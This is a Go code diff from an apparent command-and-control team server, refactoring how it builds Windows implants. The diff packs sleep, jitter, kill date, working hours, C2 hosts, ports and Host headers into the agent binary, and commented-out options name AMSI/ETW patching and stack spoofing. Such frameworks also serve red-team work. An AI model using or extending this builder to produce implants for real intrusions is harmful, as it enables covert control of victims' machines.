@@ -1,5 +1,6 @@
 package Builder
 
+import "C"
 import (
 	"AllSecure/TeamServer/Common/Packer"
 	"AllSecure/TeamServer/Common/Types"
@@ -22,7 +23,7 @@ type AgentBuilder struct {
 	Types.AgentBuilder
 }
 
-func NewImplantBuilder(path string) *AgentBuilder {
+func NewImplantBuilder(ImpConfig *Types.ImplantConfig, path string) *AgentBuilder {
 	var builder = new(AgentBuilder)
 
 	builder.SourcePath = path + "/" + Types.PayloadDir + "/" + "Agent" + "/"
@@ -37,15 +38,8 @@ func NewImplantBuilder(path string) *AgentBuilder {
 	} else {
 		log.Println("[error] type assertion failed", err)
 	}
-	ImplantConfig, err := Utility.ParseConfig(ConfigPath, "Implant.Config", &builder.ImplantConfig)
-	if err != nil {
-		log.Println("[error] reading the configuration file, implant config", err)
-	}
-	if ImpConfig, ok := ImplantConfig.(*Types.ImplantConfig); ok {
-		builder.ImplantConfig = *ImpConfig
-	} else {
-		log.Println("[error] type assertion failed", err)
-	}
+
+	builder.ImplantConfig = *ImpConfig
 
 	builder.CompilerOptions.SourceDirs = []string{
 		"src/agent",
@@ -145,7 +139,6 @@ func (ab *AgentBuilder) Build() bool {
 		log.Println("[error] attempting to create patch config: ", err)
 		return false
 	}
-	log.Println("[info] Len Config Bytes: ", len(Config))
 	ConfigByteString := "{"
 	for i := range Config {
 		if i == (len(Config) - 1) {
@@ -156,7 +149,6 @@ func (ab *AgentBuilder) Build() bool {
 	}
 	ConfigByteString += "}"
 	ab.CompilerOptions.Defines = append(ab.CompilerOptions.Defines, "CONFIG_BYTES="+ConfigByteString)
-	log.Println("[info] Config Bytes: ", ConfigByteString)
 
 	if ab.ImplantConfig.Arch == Types.ARCHITECTURE_X64 {
 		abs, err := filepath.Abs(ab.CompilerOptions.Config.Compiler64)
@@ -244,8 +236,7 @@ func (ab *AgentBuilder) Build() bool {
 func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 	var (
 		AgentConfig = Packer.Packer{}
-		Sleep       int
-		Jitter      int
+		Headers     []string
 		//Alloc        int
 		//Execute      int
 		//Spawn64      string
@@ -256,54 +247,45 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 		//StackSpoof   = win32.FALSE
 		//Syscall      = win32.FALSE
 		//AmsiPatch    = AMSIETW_PATCH_NONE
-		err error
 	)
-	log.Println("[info] the config values are: ", ab.ImplantConfig)
-	Sleep, err = strconv.Atoi(ab.ImplantConfig.Sleep)
-	if err != nil {
-		log.Println("[error] failed to convert sleep value to int: ", err)
-		return nil, err
+	if ab.ImplantConfig.Sleep < 0 {
+		return nil, errors.New("sleep value must be greater than 0")
 	}
 
-	Jitter, err = strconv.Atoi(ab.ImplantConfig.Jitter)
-	if err != nil {
-		log.Println("[error] failed to convert jitter value to int: ", err)
-		return nil, err
-	}
-	if Jitter < 0 || Jitter > 100 {
+	if ab.ImplantConfig.Jitter < 0 || ab.ImplantConfig.Jitter > 100 {
 		return nil, errors.New("jitter value must be between 0 and 100")
-	} else if Jitter == 0 {
+	} else if ab.ImplantConfig.Jitter == 0 {
 		log.Println("[warning] jitter value not set, defaulting to 0")
 	}
 
-	AgentConfig.AddInt(Sleep)
-	AgentConfig.AddInt(Jitter)
+	AgentConfig.AddInt(ab.ImplantConfig.Sleep)
+	AgentConfig.AddInt(ab.ImplantConfig.Jitter)
 
-	switch ab.ImplantConfig.ListenerType {
+	switch ab.ImplantConfig.ListenerConfig.ListenerType {
 	case Types.HTTP_SERVER:
 		var (
 			Config = ab.ImplantConfig.ListenerConfig
 			err    error
 		)
-		AgentConfig.AddInt64(Config.KillDate)
-		WorkingHours, err := Utility.ParseWorkingHours(Config.WorkingHours)
+		AgentConfig.AddInt64(ab.ImplantConfig.KillDate)
+		WorkingHours, err := Utility.ParseWorkingHours(ab.ImplantConfig.WorkingHours)
 		if err != nil {
 			log.Println("[error] failed to parse working hours: ", err)
 		}
 
 		AgentConfig.AddInt32(WorkingHours)
 
-		if strings.ToLower(Config.Method) == "get" {
+		if strings.ToLower(ab.ImplantConfig.ListenerConfig.Method) == "get" {
 			return nil, errors.New("[error] Get method is not supported")
 		} else {
 			AgentConfig.AddWString("POST")
 		}
 
-		switch Config.HostRotation {
-		case "round-robin":
+		switch ab.ImplantConfig.HostRotation {
+		case "Round-Robin":
 			AgentConfig.AddInt(0)
 			break
-		case "random":
+		case "Random":
 			AgentConfig.AddInt(1)
 			break
 		default:
@@ -311,8 +293,8 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 			break
 		}
 
-		AgentConfig.AddInt(len(Config.Hosts)) // add number of potential hosts to config buffer.
-		for _, host := range Config.Hosts {
+		AgentConfig.AddInt(len(ab.ImplantConfig.ListenerConfig.Hosts)) // add number of potential hosts to config buffer.
+		for _, host := range ab.ImplantConfig.ListenerConfig.Hosts {
 			var HostAndPort []string
 
 			HostAndPort = strings.Split(host, ":")
@@ -325,7 +307,7 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 			AgentConfig.AddInt(port)
 		}
 
-		if Config.Secure {
+		if ab.ImplantConfig.ListenerConfig.Secure {
 			AgentConfig.AddInt(win32.TRUE)
 		} else {
 			AgentConfig.AddInt(win32.FALSE)
@@ -343,10 +325,11 @@ func (ab *AgentBuilder) PatchConfig() ([]byte, error) {
 			}
 		} else { // if headers is not zero
 			if Config.HostHeader != "" {
-				Config.Headers = append(Config.Headers, "Host: "+Config.HostHeader)
+				Headers = append(Headers, "Host: "+Config.HostHeader)
 			}
-			AgentConfig.AddInt(len(Config.Headers)) // add number of headers to config buffer
-			for _, header := range Config.Headers {
+			Headers = append(Headers, strings.Split(Config.Headers, ",")...) // split custom headers field
+			AgentConfig.AddInt(len(Headers))                                 // add number of headers to config buffer
+			for _, header := range Headers {
 				AgentConfig.AddWString(header) // add header to config buffer
 			}
 		}
@@ -372,25 +355,27 @@ func (ab *AgentBuilder) CompileCmd(cmd []string) bool {
 	CommandLine.Stderr = &stderr
 	CommandLine.Args = append(CommandLine.Args, cmd...)
 
-	//TODO remove debug output
-	log.Println("[info] compiling agent with command: ", CommandLine.Args)
-	log.Println("[info] compiling agent with working directory: ", ab.SourcePath)
-
 	err = CommandLine.Run()
 	if err != nil {
 		//TODO remove debug output
 		log.Println("[error] stderr output: ", CommandLine.Stderr)
-		log.Println("[error] stdout output: ", CommandLine.Stdout)
 		log.Println("[error] failed to compile agent: ", err)
 		return false
 	}
+
+	err = os.Rename(ab.OutputPath, ab.SourcePath+Types.PayloadName+"."+ab.FileExtenstion)
+	if err != nil {
+		log.Println("[error] attempting to move compiled binary: ", err)
+		return false
+	}
+
 	return true
 }
 
 func (ab *AgentBuilder) GetListenerDefinitons() []string {
 	var def []string
 
-	switch ab.ImplantConfig.ListenerType {
+	switch ab.ImplantConfig.ListenerConfig.ListenerType {
 	case Types.HTTP_SERVER:
 		def = append(def, "TRANSPORT_HTTP")
 		break
